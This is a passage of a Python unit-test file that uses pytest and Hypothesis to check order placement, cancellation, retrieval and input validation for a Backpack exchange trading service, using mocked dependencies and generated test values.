"""Unit tests for BackpackTradingService order management functionality with Property-Based Testing.

------------------------------------------------------------------------

Comprehensive property-based test suite for BackpackTradingService order management operations.
Tests service layer functionality with mocked dependencies including:
- Order placement with validation of all parameters (symbol, side, quantity, price, etc.)
- Order cancellation (single orders and batch cancellation)
- Order retrieval and status checking
- Input validation testing (empty symbols, invalid quantities/prices, empty IDs)
- Error handling scenarios (API errors, validation errors, unexpected exceptions)
- Edge cases, boundary values, and malicious input resistance
- Various order types, time-in-force options, and execution parameters
- Hundreds of generated test combinations for comprehensive service layer coverage
"""

from __future__ import annotations

from decimal import Decimal
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from hypothesis import assume, given, settings, strategies as st
from hypothesis.strategies import SearchStrategy, composite
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_order import BackpackRawOrderResponse
from cyberdelta.apis.backpack.services.bp_trading_service import BackpackTradingService
from cyberdelta.apis.base.trading_execution_domain import (
    LiquidityRequirement,
    OrderExecution,
)
from cyberdelta.apis.common import APIError, APIErrorCode
from cyberdelta.apis.models.service_args.trading import (
    CancelOrderArgs,
    GetOrderArgs,
    PlaceOrderArgs,
)
from cyberdelta.core.enums import CancelOrderResultStatus
from cyberdelta.enums import OrderSide, OrderType, TimeInForce
from cyberdelta.models.market.order import CancelOrderResult
from cyberdelta.symbols import exchanges
from cyberdelta.symbols.models import Symbol
from tests.common_symbols import SOL_USDC_BP


# Import fixtures from the shared conftest
pytest_plugins = ["tests.unit.apis.backpack.services.conftest_trading"]


class TestBackpackTradingServiceOrderManagement:
    """Tests for the BackpackTradingService order management functionality."""

    # =============================================================================
    # INPUT VALIDATION TESTS (NEW - ITERATION 2)
    # =============================================================================

    @pytest.mark.asyncio
    async def test_place_order_empty_symbol_validation(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Test place_order raises ValidationError for empty symbol (now from PlaceOrderArgs)."""
        # Test with actual invalid symbol creation

        with pytest.raises((ValidationError, ValueError)):
            invalid_symbol = exchanges.backpack("")
            PlaceOrderArgs(
                symbol=invalid_symbol,  # Empty symbol should be rejected
                side=OrderSide.BUY,
                order_type=OrderType.LIMIT,
                quantity=Decimal("10.0"),
                time_in_force=TimeInForce.GTC,
                price=Decimal("100.0"),
                execution=OrderExecution(),
            )

    @pytest.mark.asyncio
    async def test_place_order_invalid_quantity_validation(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Test place_order raises ValueError for invalid quantity values."""
        # Test zero quantity
        with pytest.raises(ValueError) as exc_info:
            args = PlaceOrderArgs(
                symbol=SOL_USDC_BP,
                side=OrderSide.BUY,
                order_type=OrderType.LIMIT,
                quantity=Decimal("0.0"),  # Invalid: zero quantity
                time_in_force=TimeInForce.GTC,
                price=Decimal("100.0"),
                execution=OrderExecution(),
            )
            await bp_trading_service.place_order(args=args)
        assert "Input should be greater than 0" in str(exc_info.value)

        # Test negative quantity
        with pytest.raises(ValueError) as exc_info:
            args = PlaceOrderArgs(
                symbol=SOL_USDC_BP,
                side=OrderSide.BUY,
                order_type=OrderType.LIMIT,
                quantity=Decimal("-5.0"),  # Invalid: negative quantity
                time_in_force=TimeInForce.GTC,
                price=Decimal("100.0"),
                execution=OrderExecution(),
            )
            await bp_trading_service.place_order(args=args)
        assert "Input should be greater than 0" in str(exc_info.value)

        # Test infinite quantity
        with pytest.raises(ValueError) as exc_info:
            args = PlaceOrderArgs(
                symbol=SOL_USDC_BP,
                side=OrderSide.BUY,
                order_type=OrderType.LIMIT,
                quantity=Decimal("inf"),  # Invalid: infinite quantity
                time_in_force=TimeInForce.GTC,
                price=Decimal("100.0"),
                execution=OrderExecution(),
            )
            await bp_trading_service.place_order(args=args)
        assert "must be a finite decimal" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_place_order_invalid_price_validation(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Test place_order raises ValueError for invalid price values when provided."""
        # Test zero price
        with pytest.raises(ValueError) as exc_info:
            args = PlaceOrderArgs(
                symbol=SOL_USDC_BP,
                side=OrderSide.BUY,
                order_type=OrderType.LIMIT,
                quantity=Decimal("10.0"),
                time_in_force=TimeInForce.GTC,
                price=Decimal("0.0"),  # Invalid: zero price
                execution=OrderExecution(),
            )
            await bp_trading_service.place_order(args=args)
        assert "Input should be greater than 0" in str(exc_info.value)

        # Test negative price
        with pytest.raises(ValueError) as exc_info:
            args = PlaceOrderArgs(
                symbol=SOL_USDC_BP,
                side=OrderSide.BUY,
                order_type=OrderType.LIMIT,
                quantity=Decimal("10.0"),
                time_in_force=TimeInForce.GTC,
                price=Decimal("-50.0"),  # Invalid: negative price
                execution=OrderExecution(),
            )
            await bp_trading_service.place_order(args=args)
        assert "Input should be greater than 0" in str(exc_info.value)

        # Test infinite price
        with pytest.raises(ValueError) as exc_info:
            args = PlaceOrderArgs(
                symbol=SOL_USDC_BP,
                side=OrderSide.BUY,
                order_type=OrderType.LIMIT,
                quantity=Decimal("10.0"),
                time_in_force=TimeInForce.GTC,
                price=Decimal("inf"),  # Invalid: infinite price
                execution=OrderExecution(),
            )
            await bp_trading_service.place_order(args=args)
        assert "must be a finite decimal" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_place_order_invalid_stop_price_validation(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Test place_order raises ValueError for invalid stop_price values when provided."""
        # Test negative stop_price
        with pytest.raises(ValueError) as exc_info:
            args = PlaceOrderArgs(
                symbol=SOL_USDC_BP,
                side=OrderSide.BUY,
                order_type=OrderType.STOP_LIMIT,
                quantity=Decimal("10.0"),
                time_in_force=TimeInForce.GTC,
                price=Decimal("100.0"),
                stop_price=Decimal("-10.0"),  # Invalid: negative stop_price
                execution=OrderExecution(),
            )
            await bp_trading_service.place_order(args=args)
        assert "Input should be greater than 0" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_cancel_order_empty_order_id_validation(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Test cancel_order raises ValidationError for empty order_id."""
        with pytest.raises(ValidationError) as exc_info:
            CancelOrderArgs(
                order_id="",  # Empty order_id should be rejected
                symbol=SOL_USDC_BP,
            )

        assert "String cannot be empty" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_cancel_order_empty_symbol_validation(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Test cancel_order raises ValidationError for empty symbol."""
        # Test with actual invalid symbol creation
        with pytest.raises((ValidationError, ValueError)):
            invalid_symbol = exchanges.backpack("")
            CancelOrderArgs(
                order_id="12345",
                symbol=invalid_symbol,  # Empty symbol should be rejected
            )

    @pytest.mark.asyncio
    async def test_get_order_empty_order_id_validation(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Test get_order raises ValidationError for empty order_id."""
        with pytest.raises(ValidationError) as exc_info:
            GetOrderArgs(order_id="", symbol=SOL_USDC_BP)

        assert "String cannot be empty" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_get_order_none_symbol_validation(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Test get_order raises ValueError for None symbol."""
        with pytest.raises(ValueError) as exc_info:
            await bp_trading_service.get_order(args=GetOrderArgs(order_id="12345", symbol=None))

        assert "symbol is required for get order on Backpack" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_get_order_empty_symbol_validation(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Test get_order raises ValidationError for empty symbol."""
        # Test with actual invalid symbol creation
        with pytest.raises((ValidationError, ValueError)):
            invalid_symbol = exchanges.backpack("")
            GetOrderArgs(order_id="12345", symbol=invalid_symbol)

    @pytest.mark.asyncio
    async def test_get_order_status_none_symbol_validation(
        self,
        bp_trading_service: BackpackTradingService,
    ) -> None:
        """Test get_order_status returns None for invalid arguments (catches validation errors)."""
        # Mock the order query service to simulate validation error
        with patch.object(bp_trading_service, "_order_query_service") as mock_query_service:
            mock_query_service.get_order = AsyncMock(side_effect=ValueError("symbol is required"))

            result = await bp_trading_service.get_order_status(
                args=GetOrderArgs(order_id="12345", symbol=None),  # None symbol triggers error
            )

            # get_order_status should catch the exception and return None
            assert result is None

    # =============================================================================
    # EXISTING FUNCTIONALITY TESTS
    # =============================================================================

    @pytest.mark.asyncio
    async def test_place_order_success(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test place_order successfully places an order."""
        symbol = SOL_USDC_BP
        side = OrderSide.BUY
        order_type = OrderType.LIMIT
        quantity = Decimal("10.0")
        price = Decimal("100.0")
        time_in_force = TimeInForce.GTC
        client_order_id = "client_order_123"

        order_data = {
            "id": "12345",
            "clientId": client_order_id,
            "relatedOrderId": "order_123",
            "symbol": symbol.value,
            "side": "Bid",
            "orderType": order_type.value,
            "quantity": str(quantity),
            "price": str(price),
            "executedQuantity": "0",
            "executedQuoteQuantity": "0",
            "triggerPrice": "0",
            "avgFillPrice": "0",
            "status": "NEW",
            "timeInForce": time_in_force.value,
            "triggerBy": "last",
            "reduceOnly": False,
            "postOnly": False,
            "selfTradePrevention": "cn",
            "createdAt": 1678886400000,
            "updatedAt": 1678886400000,
            "triggeredAt": None,
            "expiryReason": None,
            "origin": "API",
        }

        BackpackRawOrderResponse.model_validate(order_data)

        # Mock a simple Order object result (the actual return type)
        MagicMock()

        # Mock the order placement service since business logic delegates to it
        with patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service:
            mock_internal_order = MagicMock()
            mock_placement_service.place_order = AsyncMock(return_value=mock_internal_order)

            args = PlaceOrderArgs(
                symbol=symbol,
                side=side,
                order_type=order_type,
                quantity=quantity,
                time_in_force=time_in_force,
                price=price,
                client_order_id="123456",  # Use numeric string instead of alphanumeric
                execution=OrderExecution(),
            )
            result = await bp_trading_service.place_order(args=args)

            # Verify the business logic calls the order placement service with correct arguments
            mock_placement_service.place_order.assert_called_once_with(args)
            assert result == mock_internal_order

    @pytest.mark.asyncio
    async def test_place_order_http_client_returns_none(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test place_order when HTTP client returns None content."""
        symbol = SOL_USDC_BP
        side = OrderSide.BUY
        order_type = OrderType.LIMIT
        quantity = Decimal("10.0")
        price = Decimal("100.0")
        time_in_force = TimeInForce.GTC

        # Mock the order placement service to raise an API error
        # (simulating HTTP client returning None)
        with patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service:
            api_error = APIError(
                code=APIErrorCode.INVALID_RESPONSE.value,
                message=f"No data received for place order for {symbol}, status: 200",
            )
            mock_placement_service.place_order = AsyncMock(side_effect=api_error)

            args = PlaceOrderArgs(
                symbol=symbol,
                side=side,
                order_type=order_type,
                quantity=quantity,
                time_in_force=time_in_force,
                price=price,
                execution=OrderExecution(),
            )
            with pytest.raises(APIError) as exc_info:
                await bp_trading_service.place_order(args=args)

            assert exc_info.value.code == APIErrorCode.INVALID_RESPONSE.value
            assert (
                f"No data received for place order for {symbol}, status: 200"
                in exc_info.value.message
            )

            # Verify the business logic calls the order placement service
            mock_placement_service.place_order.assert_called_once_with(args)

    @pytest.mark.asyncio
    async def test_place_order_validation_error(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test place_order handles validation error from response handler."""
        symbol = SOL_USDC_BP
        side = OrderSide.BUY
        order_type = OrderType.LIMIT
        quantity = Decimal("10.0")
        price = Decimal("100.0")
        time_in_force = TimeInForce.GTC

        # Create a ValidationError by trying to validate invalid data
        try:
            BackpackRawOrderResponse.model_validate({"invalid": "data"})
        except ValidationError as validation_error:
            # Mock the order placement service to raise the validation error
            with patch.object(
                bp_trading_service, "_order_placement_service"
            ) as mock_placement_service:
                mock_placement_service.place_order = AsyncMock(side_effect=validation_error)

                args = PlaceOrderArgs(
                    symbol=symbol,
                    side=side,
                    order_type=order_type,
                    quantity=quantity,
                    time_in_force=time_in_force,
                    price=price,
                    execution=OrderExecution(),
                )
                with pytest.raises(ValidationError):
                    await bp_trading_service.place_order(args=args)

                # Verify the business logic calls the order placement service
                mock_placement_service.place_order.assert_called_once_with(args)

    @pytest.mark.asyncio
    async def test_place_order_unexpected_exception(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test place_order handles unexpected exception."""
        symbol = SOL_USDC_BP
        side = OrderSide.BUY
        order_type = OrderType.LIMIT
        quantity = Decimal("10.0")
        price = Decimal("100.0")
        time_in_force = TimeInForce.GTC

        # Mock the order placement service to raise an unexpected exception
        with patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service:
            mock_placement_service.place_order = AsyncMock(
                side_effect=Exception("Unexpected error")
            )

            args = PlaceOrderArgs(
                symbol=symbol,
                side=side,
                order_type=order_type,
                quantity=quantity,
                time_in_force=time_in_force,
                price=price,
                execution=OrderExecution(),
            )
            with pytest.raises(Exception) as exc_info:
                await bp_trading_service.place_order(args=args)

            assert "Unexpected error" in str(exc_info.value)

            # Verify the business logic calls the order placement service
            mock_placement_service.place_order.assert_called_once_with(args)

    @pytest.mark.asyncio
    async def test_cancel_order_success(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test cancel_order successfully cancels an order."""
        symbol = SOL_USDC_BP
        order_id = "12345"

        MagicMock()

        # The service returns CancelOrderResult
        mock_cancel_result = CancelOrderResult(
            symbol=symbol,
            order_id=order_id,
            client_order_id=None,
            success=True,
            message=None,
            status=CancelOrderResultStatus.SUCCESS,
            raw_response=None,
        )

        # Mock the order cancellation service since business logic delegates to it
        with patch.object(
            bp_trading_service, "_order_cancellation_service"
        ) as mock_cancellation_service:
            mock_cancellation_service.cancel_order = AsyncMock(return_value=mock_cancel_result)

            args = CancelOrderArgs(order_id=order_id, symbol=symbol)
            result = await bp_trading_service.cancel_order(args=args)

            # Verify the business logic calls the order cancellation service with correct arguments
            mock_cancellation_service.cancel_order.assert_called_once_with(args)
            assert result == mock_cancel_result

    @pytest.mark.asyncio
    async def test_cancel_order_http_client_returns_none(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test cancel_order when HTTP client returns None content."""
        symbol = SOL_USDC_BP
        order_id = "12345"

        # Mock the order cancellation service to raise an API error
        # (simulating HTTP client returning None)
        with patch.object(
            bp_trading_service, "_order_cancellation_service"
        ) as mock_cancellation_service:
            api_error = APIError(
                code=APIErrorCode.INVALID_RESPONSE.value,
                message=f"No data received for cancel order {order_id} ({symbol}), status: 200",
            )
            mock_cancellation_service.cancel_order = AsyncMock(side_effect=api_error)

            args = CancelOrderArgs(order_id=order_id, symbol=symbol)
            with pytest.raises(APIError) as exc_info:
                await bp_trading_service.cancel_order(args=args)

            assert exc_info.value.code == APIErrorCode.INVALID_RESPONSE.value
            assert (
                f"No data received for cancel order {order_id} ({symbol}), status: 200"
                in exc_info.value.message
            )

            # Verify the business logic calls the order cancellation service
            mock_cancellation_service.cancel_order.assert_called_once_with(args)

    @pytest.mark.asyncio
    async def test_cancel_order_validation_error(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test cancel_order handles validation error from response handler."""
        symbol = SOL_USDC_BP
        order_id = "12345"

        # Mock the order cancellation service to raise a validation error
        with patch.object(
            bp_trading_service, "_order_cancellation_service"
        ) as mock_cancellation_service:
            validation_error = ValidationError.from_exception_data(
                title="ValidationError",
                line_errors=[],
            )
            mock_cancellation_service.cancel_order = AsyncMock(side_effect=validation_error)

            args = CancelOrderArgs(order_id=order_id, symbol=symbol)
            with pytest.raises(ValidationError):
                await bp_trading_service.cancel_order(args=args)

            # Verify the business logic calls the order cancellation service
            mock_cancellation_service.cancel_order.assert_called_once_with(args)

    @pytest.mark.asyncio
    async def test_cancel_order_unexpected_exception(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test cancel_order handles unexpected exception."""
        symbol = SOL_USDC_BP
        order_id = "12345"

        # Mock the order cancellation service to raise an unexpected exception
        with patch.object(
            bp_trading_service, "_order_cancellation_service"
        ) as mock_cancellation_service:
            mock_cancellation_service.cancel_order = AsyncMock(
                side_effect=Exception("Unexpected error")
            )

            args = CancelOrderArgs(order_id=order_id, symbol=symbol)
            with pytest.raises(Exception) as exc_info:
                await bp_trading_service.cancel_order(args=args)

            assert "Unexpected error" in str(exc_info.value)

            # Verify the business logic calls the order cancellation service
            mock_cancellation_service.cancel_order.assert_called_once_with(args)

    @pytest.mark.asyncio
    async def test_cancel_all_orders_success(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test cancel_all_orders successfully cancels orders for a given symbol."""
        symbol = SOL_USDC_BP
        # Create proper order data that can be validated as BackpackRawOrderResponse objects
        mock_raw_response_list = [
            {
                "id": "order1",
                "symbol": symbol.value,
                "side": "Buy",
                "orderType": "LIMIT",
                "status": "CANCELLED",
                "quantity": "1.0",
                "price": "100.0",
                "createdAt": "2024-01-15T10:30:00Z",
                "clientId": None,
                "executedQuantity": "0.0",
                "executedQuoteQuantity": "0.0",
                "timeInForce": "GTC",
                "reduceOnly": False,
                "postOnly": False,
                "selfTradePrevention": None,
                "relatedOrderId": None,
                "avgFillPrice": None,
                "triggerPrice": None,
                "triggerBy": None,
                "updatedAt": None,
                "triggeredAt": None,
                "expiryReason": None,
                "origin": None,
            },
            {
                "id": "order2",
                "symbol": symbol.value,
                "side": "Sell",
                "orderType": "LIMIT",
                "status": "CANCELLED",
                "quantity": "2.0",
                "price": "105.0",
                "createdAt": "2024-01-15T10:30:00Z",
                "clientId": None,
                "executedQuantity": "0.0",
                "executedQuoteQuantity": "0.0",
                "timeInForce": "GTC",
                "reduceOnly": False,
                "postOnly": False,
                "selfTradePrevention": None,
                "relatedOrderId": None,
                "avgFillPrice": None,
                "triggerPrice": None,
                "triggerBy": None,
                "updatedAt": None,
                "triggeredAt": None,
                "expiryReason": None,
                "origin": None,
            },
        ]

        # Mock the response handler to return BackpackRawOrderResponse objects
        mock_raw_orders: list[BackpackRawOrderResponse] = []
        for order_data in mock_raw_response_list:
            # Create BackpackRawOrderResponse with explicit field mapping to avoid mypy confusion
            # Use type assertions to help mypy understand the types
            raw_order = BackpackRawOrderResponse(
                id=str(order_data["id"]),
                symbol=str(order_data["symbol"]),
                side=str(order_data["side"]),
                orderType=str(order_data["orderType"]),
                status=str(order_data["status"]),
                quantity=str(order_data["quantity"])
                if order_data.get("quantity") is not None
                else None,
                price=str(order_data["price"]) if order_data.get("price") is not None else None,
                createdAt=str(order_data["createdAt"]),  # int | float | str
                clientId=str(order_data["clientId"])
                if order_data.get("clientId") is not None
                else None,
                executedQuantity=str(order_data["executedQuantity"])
                if order_data.get("executedQuantity") is not None
                else None,
                executedQuoteQuantity=str(order_data["executedQuoteQuantity"])
                if order_data.get("executedQuoteQuantity") is not None
                else None,
                timeInForce=str(order_data["timeInForce"])
                if order_data.get("timeInForce") is not None
                else None,
                reduceOnly=bool(order_data["reduceOnly"])
                if order_data.get("reduceOnly") is not None
                else None,
                postOnly=bool(order_data["postOnly"])
                if order_data.get("postOnly") is not None
                else None,
                selfTradePrevention=str(order_data["selfTradePrevention"])
                if order_data.get("selfTradePrevention") is not None
                else None,
                relatedOrderId=str(order_data["relatedOrderId"])
                if order_data.get("relatedOrderId") is not None
                else None,
                avgFillPrice=str(order_data["avgFillPrice"])
                if order_data.get("avgFillPrice") is not None
                else None,
                triggerPrice=str(order_data["triggerPrice"])
                if order_data.get("triggerPrice") is not None
                else None,
                triggerBy=str(order_data["triggerBy"])
                if order_data.get("triggerBy") is not None
                else None,
                updatedAt=order_data.get("updatedAt"),  # int | float | str | None
                triggeredAt=order_data.get("triggeredAt"),  # int | float | str | None
                expiryReason=str(order_data["expiryReason"])
                if order_data.get("expiryReason") is not None
                else None,
                origin=str(order_data["origin"]) if order_data.get("origin") is not None else None,
            )
            mock_raw_orders.append(raw_order)

        # Mock the batch order service since business logic delegates to it
        mock_cancel_results = [
            CancelOrderResult(
                symbol=symbol,
                order_id="order1",
                client_order_id=None,
                success=True,
                message=None,
                status=CancelOrderResultStatus.SUCCESS,
                raw_response=None,
            ),
            CancelOrderResult(
                symbol=symbol,
                order_id="order2",
                client_order_id=None,
                success=True,
                message=None,
                status=CancelOrderResultStatus.SUCCESS,
                raw_response=None,
            ),
        ]

        with patch.object(bp_trading_service, "_batch_order_service") as mock_batch_service:
            mock_batch_service.cancel_all_orders = AsyncMock(return_value=mock_cancel_results)

            result = await bp_trading_service.cancel_all_orders(symbol=symbol)

            # Verify the business logic calls the batch order service with correct arguments
            mock_batch_service.cancel_all_orders.assert_called_once_with(symbol)
            assert len(result) == 2
            assert all(cancel_result.success for cancel_result in result)
            assert result[0].order_id == "order1"
            assert result[1].order_id == "order2"
            assert all(cancel_result.symbol == symbol for cancel_result in result)

    @pytest.mark.asyncio
    async def test_cancel_all_orders_http_client_returns_none(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test cancel_all_orders when HTTP client returns None content."""
        symbol = SOL_USDC_BP

        # Mock the batch order service to raise an API error (simulating HTTP client returning None)
        with patch.object(bp_trading_service, "_batch_order_service") as mock_batch_service:
            api_error = APIError(
                code=APIErrorCode.INVALID_RESPONSE.value,
                message=f"No data received for cancel all orders ({symbol}), status: 200",
            )
            mock_batch_service.cancel_all_orders = AsyncMock(side_effect=api_error)

            with pytest.raises(APIError) as exc_info:
                await bp_trading_service.cancel_all_orders(symbol=symbol)

            assert exc_info.value.code == APIErrorCode.INVALID_RESPONSE.value
            assert (
                f"No data received for cancel all orders ({symbol}), status: 200"
                in exc_info.value.message
            )

            # Verify the business logic calls the batch order service
            mock_batch_service.cancel_all_orders.assert_called_once_with(symbol)

    @pytest.mark.asyncio
    async def test_place_order_with_optional_parameters(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
        mock_response_handler: MagicMock,
    ) -> None:
        """Test place_order with optional parameters like stop_price and post_only."""
        symbol = SOL_USDC_BP
        side = OrderSide.SELL
        order_type = OrderType.LIMIT
        quantity = Decimal("5.0")
        price = Decimal("105.0")
        time_in_force = TimeInForce.IOC
        stop_price = Decimal("110.0")
        post_only = True

        BackpackRawOrderResponse(
            id="67890",
            clientId=None,
            relatedOrderId="order_456",
            symbol=symbol.value,
            side="Ask",
            orderType=order_type.value,
            quantity=str(quantity),
            price=str(price),
            executedQuantity="0",
            executedQuoteQuantity="0",
            triggerPrice=str(stop_price),
            avgFillPrice="0",
            status="NEW",
            timeInForce=time_in_force.value,
            triggerBy="last",
            reduceOnly=False,
            postOnly=post_only,
            selfTradePrevention="cn",
            createdAt=1678886400000,
            updatedAt=1678886400000,
            triggeredAt=None,
            expiryReason=None,
            origin="API",
        )
        mock_order_result = MagicMock()

        # Mock the order placement service since business logic delegates to it
        with patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service:
            mock_placement_service.place_order = AsyncMock(return_value=mock_order_result)

            args = PlaceOrderArgs(
                symbol=symbol,
                side=side,
                order_type=order_type,
                quantity=quantity,
                time_in_force=time_in_force,
                price=price,
                stop_price=stop_price,
                execution=OrderExecution(liquidity_requirement=LiquidityRequirement.POST_ONLY),
            )
            result = await bp_trading_service.place_order(args=args)

            # Verify the business logic calls the order placement service with correct arguments
            mock_placement_service.place_order.assert_called_once_with(args)
            assert result == mock_order_result

    @pytest.mark.asyncio
    async def test_place_order_non_dict_response(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
    ) -> None:
        """Test place_order handles non-dict response."""
        symbol = SOL_USDC_BP
        side = OrderSide.BUY
        order_type = OrderType.LIMIT
        quantity = Decimal("10.0")
        price = Decimal("100.0")
        time_in_force = TimeInForce.GTC

        # Mock the order placement service to raise an API error for invalid response format
        with patch.object(bp_trading_service, "_order_placement_service") as mock_placement_service:
            error_message = (
                f"Unexpected place order for {symbol} response format: expected dict, got str"
            )
            api_error = APIError(code=APIErrorCode.INVALID_RESPONSE.value, message=error_message)
            mock_placement_service.place_order = AsyncMock(side_effect=api_error)

            args = PlaceOrderArgs(
                symbol=symbol,
                side=side,
                order_type=order_type,
                quantity=quantity,
                time_in_force=time_in_force,
                price=price,
                execution=OrderExecution(),
            )
            with pytest.raises(APIError) as exc_info:
                await bp_trading_service.place_order(args=args)

            assert exc_info.value.code == APIErrorCode.INVALID_RESPONSE.value
            assert (
                f"Unexpected place order for {symbol} response format: expected dict, got str"
                in exc_info.value.message
            )

            # Verify the business logic calls the order placement service
            mock_placement_service.place_order.assert_called_once_with(args)

    @pytest.mark.asyncio
    async def test_cancel_all_orders_no_data(
        self,
        bp_trading_service: BackpackTradingService,
        mock_http_client_requester: AsyncMock,
        mock_request_builder: MagicMock,
    ) -> None:
        """Test cancel_all_orders when no data is returned."""
        symbol = SOL_USDC_BP

        # Mock the batch order service to return empty list when no data received
        with patch.object(bp_trading_service, "_batch_order_service") as mock_batch_service:
            mock_batch_service.cancel_all_orders = AsyncMock(return_value=[])

            # Based on service implementation, it returns empty list when no data received
            result = await bp_trading_service.cancel_all_orders(symbol=symbol)

            # Verify the business logic calls the batch order service
            mock_batch_service.cancel_all_orders.assert_called_once_with(symbol)
            assert result == []


# =======================
# Property-Based Testing Strategy Builders
# =======================


def bp_symbol_strategy() -> SearchStrategy[Symbol]:
    """Generate valid Backpack symbols for trading.

    Returns:
        SearchStrategy[Symbol]: Strategy for valid Backpack trading symbols.
    """
    return st.sampled_from([
        SOL_USDC_BP,
        exchanges.backpack("BTC-USDC"),
        exchanges.backpack("ETH-USDC"),
        exchanges.backpack("BTC-USDT"),
        exchanges.backpack("ETH-USDT"),
        exchanges.backpack("SOL-USDT"),
        exchanges.backpack("SOL-PERP"),
        exchanges.backpack("BTC-PERP"),
        exchanges.backpack("ETH-PERP"),
    ])


def order_side_strategy() -> SearchStrategy[OrderSide]:
    """Generate valid order sides.

    Returns:
        SearchStrategy[OrderSide]: Strategy for order sides.
    """
    return st.sampled_from([OrderSide.BUY, OrderSide.SELL])


def order_type_strategy() -> SearchStrategy[OrderType]:
    """Generate valid order types.

    Returns:
        SearchStrategy[OrderType]: Strategy for order types.
    """
    return st.sampled_from([OrderType.MARKET, OrderType.LIMIT, OrderType.STOP_LIMIT])


def time_in_force_strategy() -> SearchStrategy[TimeInForce]:
    """Generate valid time-in-force values.

    Returns:
        SearchStrategy[TimeInForce]: Strategy for time-in-force values.
    """
    return st.sampled_from([TimeInForce.GTC, TimeInForce.IOC, TimeInForce.FOK])


def liquidity_requirement_strategy() -> SearchStrategy[LiquidityRequirement]:
    """Generate valid liquidity requirements.

    Returns:
        SearchStrategy[LiquidityRequirement]: Strategy for liquidity requirements.
    """
    return st.sampled_from([
        LiquidityRequirement.IMMEDIATE_OR_CANCEL,
        LiquidityRequirement.FILL_OR_KILL,
        LiquidityRequirement.POST_ONLY,
    ])


def valid_quantity_strategy() -> SearchStrategy[Decimal]:
    """Generate valid order quantities.

    Returns:
        SearchStrategy[Decimal]: Strategy for valid quantities.
    """
    return st.decimals(min_value=Decimal("0.001"), max_value=Decimal(1000000), places=3)


def valid_price_strategy() -> SearchStrategy[Decimal]:
    """Generate valid order prices.

    Returns:
        SearchStrategy[Decimal]: Strategy for valid prices.
    """
    return st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=2)


def invalid_quantity_strategy() -> SearchStrategy[Decimal]:
    """Generate invalid order quantities for testing validation.

    Returns:
        SearchStrategy[Decimal]: Strategy for invalid quantities.
    """
    return st.one_of([
        st.just(Decimal(0)),  # Zero
        st.decimals(max_value=Decimal("-0.001"), places=3),  # Negative
        st.just(Decimal("inf")),  # Infinite
        st.just(Decimal("-inf")),  # Negative infinite
        st.just(Decimal("nan")),  # NaN
    ])


def invalid_price_strategy() -> SearchStrategy[Decimal]:
    """Generate invalid order prices for testing validation.

    Returns:
        SearchStrategy[Decimal]: Strategy for invalid prices.
    """
    return st.one_of([
        st.just(Decimal(0)),  # Zero
        st.decimals(max_value=Decimal("-0.01"), places=2),  # Negative
        st.just(Decimal("inf")),  # Infinite
        st.just(Decimal("-inf")),  # Negative infinite
        st.just(Decimal("nan")),  # NaN
    ])


def order_id_strategy() -> SearchStrategy[str]:
    """Generate valid order IDs.

    Returns:
        SearchStrategy[str]: Strategy for order IDs.
    """
    return st.one_of([
        st.text(
            alphabet=st.characters(whitelist_categories=["Ll", "Lu", "Nd"]), min_size=1, max_size=64
        ),
        st.builds(
            lambda prefix, suffix: f"{prefix}_{suffix}",
            st.sampled_from(["order", "ord", "trade", "tx"]),
            st.integers(min_value=1, max_value=999999999),
        ),
        st.sampled_from(["12345", "67890", "order_123", "trade_456", "tx_789"]),
    ])


def client_order_id_strategy() -> SearchStrategy[str | None]:
    """Generate valid client order IDs (optional).

    Returns:
        SearchStrategy[str | None]: Strategy for client order IDs.
